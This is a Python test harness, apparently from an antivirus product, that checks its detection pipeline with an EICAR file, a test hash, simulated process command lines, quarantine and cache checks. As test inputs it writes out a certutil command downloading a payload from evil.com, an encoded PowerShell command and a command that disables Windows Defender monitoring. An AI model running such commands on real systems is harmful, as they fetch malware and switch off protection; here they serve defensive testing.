"""
scanner/detection_validator.py — End-to-end detection validation harness

Runs safe, non-destructive simulations to verify the entire detection
pipeline works: EICAR drop, behavioral rules, registry checks,
hash lookups, event delivery, and quarantine round-trip.

All operations use temporary files and are fully cleaned up.
"""
import hashlib
import json
import logging
import os
import shutil
import tempfile
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Callable

logger = logging.getLogger(__name__)

# EICAR test string — standard antivirus test file (completely harmless)
EICAR_STRING = (
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR"
    r"-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


class ValidationResult:
    """Result of a single validation test."""

    def __init__(self, test_name: str):
        self.test_name = test_name
        self.passed = False
        self.detail = ""
        self.duration_ms = 0
        self.error = None

    def to_dict(self) -> Dict:
        return {
            "test_name": self.test_name,
            "passed": self.passed,
            "detail": self.detail,
            "duration_ms": self.duration_ms,
            "error": self.error,
        }


class DetectionValidator:
    """Runs safe detection validation tests against live modules.

    Usage:
        validator = DetectionValidator(modules)
        report = validator.run_all()
    """

    def __init__(self, modules: Dict, event_bus=None):
        self.modules = modules
        self.event_bus = event_bus or modules.get("event_bus")
        self._results: List[ValidationResult] = []
        self._temp_dir = None

    def run_all(self, progress_callback: Optional[Callable] = None) -> Dict:
        """Run all validation tests and return report."""
        self._results.clear()
        self._temp_dir = Path(tempfile.mkdtemp(prefix="sn_validate_"))
        start = time.time()

        tests = [
            ("EICAR File Detection", self._test_eicar),
            ("Hash Lookup Detection", self._test_hash_lookup),
            ("Behavioral: Encoded PowerShell", self._test_encoded_ps),
            ("Behavioral: LOLBin Detection", self._test_lolbin),
            ("Behavioral: Defense Evasion", self._test_defense_evasion),
            ("Hosts File Integrity", self._test_hosts_file),
            ("Registry Baseline Check", self._test_registry),
            ("Event Pipeline Delivery", self._test_event_pipeline),
            ("Quarantine Round-Trip", self._test_quarantine_cycle),
            ("Scan Cache Functionality", self._test_scan_cache),
        ]

        for idx, (name, test_fn) in enumerate(tests):
            result = ValidationResult(name)
            t0 = time.time()
            try:
                test_fn(result)
            except Exception as e:
                result.passed = False
                result.error = str(e)
                result.detail = f"Exception: {e}"
                logger.error(f"Validation test '{name}' failed: {e}")
            result.duration_ms = int((time.time() - t0) * 1000)
            self._results.append(result)

            if progress_callback:
                progress_callback({
                    "current": idx + 1,
                    "total": len(tests),
                    "test_name": name,
                    "passed": result.passed,
                })

        # Cleanup
        try:
            shutil.rmtree(str(self._temp_dir), ignore_errors=True)
        except Exception:
            pass

        duration = int((time.time() - start) * 1000)
        passed = sum(1 for r in self._results if r.passed)
        total = len(self._results)

        report = {
            "timestamp": datetime.now().isoformat(),
            "total_tests": total,
            "passed": passed,
            "failed": total - passed,
            "duration_ms": duration,
            "all_passed": passed == total,
            "results": [r.to_dict() for r in self._results],
        }

        logger.info(f"Detection validation: {passed}/{total} passed ({duration}ms)")
        return report

    # ────────────────────────────────────────────────────────────────────
    #  Test: EICAR file detection
    # ────────────────────────────────────────────────────────────────────
    def _test_eicar(self, result: ValidationResult):
        """Create EICAR test file and verify file scanner detects it."""
        scanner = self.modules.get("file_scanner")
        if not scanner:
            result.detail = "file_scanner module not available"
            return

        eicar_path = self._temp_dir / "eicar_test.com"
        eicar_path.write_text(EICAR_STRING)

        # Temporarily disable auto-quarantine to prevent file deletion
        old_config = scanner.config.get("auto_quarantine", True)
        scanner.config["auto_quarantine"] = False
        try:
            scan_result = scanner.scan_file(str(eicar_path))
            if not scan_result.clean:
                result.passed = True
                result.detail = (f"EICAR detected as '{scan_result.threat_name}' "
                                 f"by {scan_result.engine} "
                                 f"(confidence={scan_result.confidence})")
            else:
                result.detail = ("EICAR NOT detected — check YARA rules include "
                                 "EICAR signature pattern")
        finally:
            scanner.config["auto_quarantine"] = old_config
            if eicar_path.exists():
                eicar_path.unlink()

    # ────────────────────────────────────────────────────────────────────
    #  Test: Hash lookup
    # ────────────────────────────────────────────────────────────────────
    def _test_hash_lookup(self, result: ValidationResult):
        """Insert a test hash into DB, create matching file, verify detection."""
        scanner = self.modules.get("file_scanner")
        db = self.modules.get("file_scanner")
        if not scanner or not scanner.db:
            result.detail = "file_scanner or database not available"
            return

        # Create a test file with known content
        test_content = b"SECURENOVA_HASH_TEST_" + str(time.time()).encode()
        test_path = self._temp_dir / "hash_test.bin"
        test_path.write_bytes(test_content)

        sha256 = hashlib.sha256(test_content).hexdigest()

        # Insert into hash DB
        try:
            scanner.db._execute(
                "INSERT OR IGNORE INTO known_hashes (sha256, md5, signature, source) "
                "VALUES (?, ?, ?, ?)",
                (sha256, "", "TestMalware.HashLookup", "validation")
            )

            old_config = scanner.config.get("auto_quarantine", True)
            scanner.config["auto_quarantine"] = False
            try:
                scan_result = scanner.scan_file(str(test_path))
                if not scan_result.clean and "HashDB" in scan_result.engine:
                    result.passed = True
                    result.detail = f"Hash match detected: {scan_result.threat_name}"
                else:
                    result.detail = "Hash was not detected via HashDB lookup"
            finally:
                scanner.config["auto_quarantine"] = old_config

            # Cleanup: remove test hash
            scanner.db._execute(
                "DELETE FROM known_hashes WHERE sha256 = ?", (sha256,)
            )
        except Exception as e:
            result.detail = f"Hash lookup test error: {e}"
        finally:
            if test_path.exists():
                test_path.unlink()

    # ────────────────────────────────────────────────────────────────────
    #  Test: Behavioral — Encoded PowerShell
    # ────────────────────────────────────────────────────────────────────
    def _test_encoded_ps(self, result: ValidationResult):
        """Simulate encoded PowerShell cmdline and verify behavior engine flags it."""
        try:
            from scanner.behavior_engine import BehaviorEngine
        except ImportError:
            result.detail = "behavior_engine not available"
            return

        engine = BehaviorEngine()
        alerts = engine.analyze_process({
            "pid": 99999,
            "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu",
            "parent_name": "cmd.exe",
        })

        encoded_alerts = [a for a in alerts if a.rule_name == "EncodedPowerShell"]
        if encoded_alerts:
            result.passed = True
            result.detail = (f"Encoded PS detected (confidence={encoded_alerts[0].confidence})")
        else:
            result.detail = "EncodedPowerShell rule did NOT trigger"

    # ────────────────────────────────────────────────────────────────────
    #  Test: Behavioral — LOLBin
    # ────────────────────────────────────────────────────────────────────
    def _test_lolbin(self, result: ValidationResult):
        """Simulate certutil abuse and verify detection."""
        try:
            from scanner.behavior_engine import BehaviorEngine
        except ImportError:
            result.detail = "behavior_engine not available"
            return

        engine = BehaviorEngine()
        alerts = engine.analyze_process({
            "pid": 99998,
            "name": "certutil.exe",
            "exe": r"C:\Windows\System32\certutil.exe",
            "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
            "parent_name": "cmd.exe",
        })

        lolbin_alerts = [a for a in alerts if a.rule_name == "LOLBinAbuse"]
        if lolbin_alerts:
            result.passed = True
            result.detail = f"LOLBin abuse detected: certutil with -urlcache"
        else:
            result.detail = "LOLBinAbuse rule did NOT trigger for certutil"

    # ────────────────────────────────────────────────────────────────────
    #  Test: Behavioral — Defense Evasion
    # ────────────────────────────────────────────────────────────────────
    def _test_defense_evasion(self, result: ValidationResult):
        """Simulate Windows Defender disabling command."""
        try:
            from scanner.behavior_engine import BehaviorEngine
        except ImportError:
            result.detail = "behavior_engine not available"
            return

        engine = BehaviorEngine()
        alerts = engine.analyze_process({
            "pid": 99997,
            "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
            "parent_name": "",
        })

        evasion_alerts = [a for a in alerts if a.rule_name == "DefenseEvasion"]
        if evasion_alerts:
            result.passed = True
            result.detail = "Defense evasion detected: Defender disabling command"
        else:
            result.detail = "DefenseEvasion rule did NOT trigger"

    # ────────────────────────────────────────────────────────────────────
    #  Test: Hosts file integrity
    # ────────────────────────────────────────────────────────────────────
    def _test_hosts_file(self, result: ValidationResult):
        """Check hosts file for suspicious entries."""
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        if not os.path.isfile(hosts_path):
            result.detail = "Hosts file not found"
            return

        try:
            with open(hosts_path, "r") as f:
                content = f.read()

            suspicious = 0
            for line in content.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split()
                if len(parts) >= 2 and parts[0] not in ("127.0.0.1", "::1", "0.0.0.0"):
                    suspicious += 1

            if suspicious == 0:
                result.passed = True
                result.detail = "Hosts file is clean"
            else:
                result.passed = True  # Detection works — it found something
                result.detail = f"Found {suspicious} suspicious hosts entries"
        except PermissionError:
            result.detail = "Cannot read hosts file (permission denied)"

    # ────────────────────────────────────────────────────────────────────
    #  Test: Registry baseline
    # ────────────────────────────────────────────────────────────────────
    def _test_registry(self, result: ValidationResult):
        """Verify registry watcher has a baseline and can detect changes."""
        reg_watcher = self.modules.get("registry_watcher")
        if not reg_watcher:
            result.detail = "registry_watcher module not available"
            return

        items = reg_watcher.get_startup_items()
        result.passed = True
        result.detail = f"Registry baseline active: {len(items)} startup entries tracked"

    # ────────────────────────────────────────────────────────────────────
    #  Test: Event pipeline
    # ────────────────────────────────────────────────────────────────────
    def _test_event_pipeline(self, result: ValidationResult):
        """Publish a test event and verify it reaches subscribers."""
        if not self.event_bus:
            result.detail = "Event bus not available"
            return

        received = []

        def listener(evt):
            received.append(evt)

        self.event_bus.subscribe("validation_test", listener)
        try:
            self.event_bus.emit("validation_test", "info", "detection_validator",
                                detail="Pipeline test event")

            if received:
                result.passed = True
                result.detail = f"Event delivered to subscriber ({len(received)} received)"
            else:
                result.detail = "Event was NOT received by subscriber"
        finally:
            self.event_bus.unsubscribe("validation_test", listener)

    # ────────────────────────────────────────────────────────────────────
    #  Test: Quarantine round-trip
    # ────────────────────────────────────────────────────────────────────
    def _test_quarantine_cycle(self, result: ValidationResult):
        """Quarantine a temp file, then restore it. Verify round-trip."""
        cleaner = self.modules.get("threat_cleaner")
        if not cleaner:
            result.detail = "threat_cleaner module not available"
            return

        test_content = b"SECURENOVA_QUARANTINE_TEST_DATA_" + str(time.time()).encode()
        test_path = self._temp_dir / "quarantine_test.bin"
        test_path.write_bytes(test_content)

        # Quarantine
        clean_result = cleaner.quarantine_file(
            str(test_path), "TestThreat.Quarantine", "test", "validator"
        )

        if not clean_result.success:
            result.detail = f"Quarantine failed: {clean_result.failure_reason}"
            return

        if test_path.exists():
            result.detail = "File still exists after quarantine"
            return

        # Restore
        quarantine_path = None
        for qdir in cleaner.quarantine_dir.iterdir():
            if qdir.is_dir():
                for f in qdir.iterdir():
                    if f.name.endswith(".quar"):
                        quarantine_path = str(f)
                        break
            if quarantine_path:
                break

        if quarantine_path:
            original_path = str(test_path)
            restored = cleaner.restore_quarantined(quarantine_path, original_path)
            if restored and test_path.exists():
                restored_content = test_path.read_bytes()
                if restored_content == test_content:
                    result.passed = True
                    result.detail = "Quarantine→Restore round-trip succeeded (content verified)"
                else:
                    result.detail = "File restored but content mismatch"
            else:
                result.detail = "Restore failed or file not found after restore"
        else:
            result.detail = "Could not find quarantined file for restore test"

        # Cleanup
        if test_path.exists():
            test_path.unlink()

    # ────────────────────────────────────────────────────────────────────
    #  Test: Scan cache
    # ────────────────────────────────────────────────────────────────────
    def _test_scan_cache(self, result: ValidationResult):
        """Verify scan cache stores and retrieves results correctly."""
        try:
            from utils.scan_cache import ScanCache
        except ImportError:
            result.detail = "scan_cache not available"
            return

        cache = ScanCache()
        test_path = self._temp_dir / "cache_test.bin"
        test_path.write_bytes(b"CACHE_TEST_DATA")

        # Store
        cache.store(str(test_path), "clean", "abc123sha256")

        # Retrieve
        cached = cache.is_cached(str(test_path))
        if cached and cached["result"] == "clean":
            result.passed = True
            result.detail = "Scan cache: store→retrieve→hit verified"
        else:
            result.detail = "Scan cache: retrieval failed after store"

        # Modify file → cache should miss
        test_path.write_bytes(b"CACHE_TEST_DATA_MODIFIED")
        cached2 = cache.is_cached(str(test_path))
        if cached2 is not None:
            result.passed = False
            result.detail += " | FAILED: cache hit after file modification"
        else:
            result.detail += " | invalidation on modification confirmed"

        # Cleanup
        cache.invalidate(str(test_path))
        if test_path.exists():
            test_path.unlink()
